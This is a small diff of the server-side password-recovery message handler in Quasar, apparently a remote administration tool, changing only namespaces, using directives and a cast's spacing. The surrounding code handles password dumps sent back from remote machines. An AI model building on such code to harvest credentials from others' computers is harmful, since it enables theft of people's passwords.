@@ -1,11 +1,8 @@
-﻿using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
-using Quasar.Server.Networking;
+﻿using Quasar.Common;
 using System.Collections.Generic;
 using System.Linq;
 
-namespace Quasar.Server.Messages
+namespace Quasar.Server
 {
     /// <summary>
     /// Handles messages for the interaction with the remote password recovery.
@@ -86,7 +83,7 @@ namespace Quasar.Server.Messages
 
         private void Execute(ISender client, GetPasswordsResponse message)
         {
-            Client c = (Client) client;
+            Client c = (Client)client;
 
             string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";
 
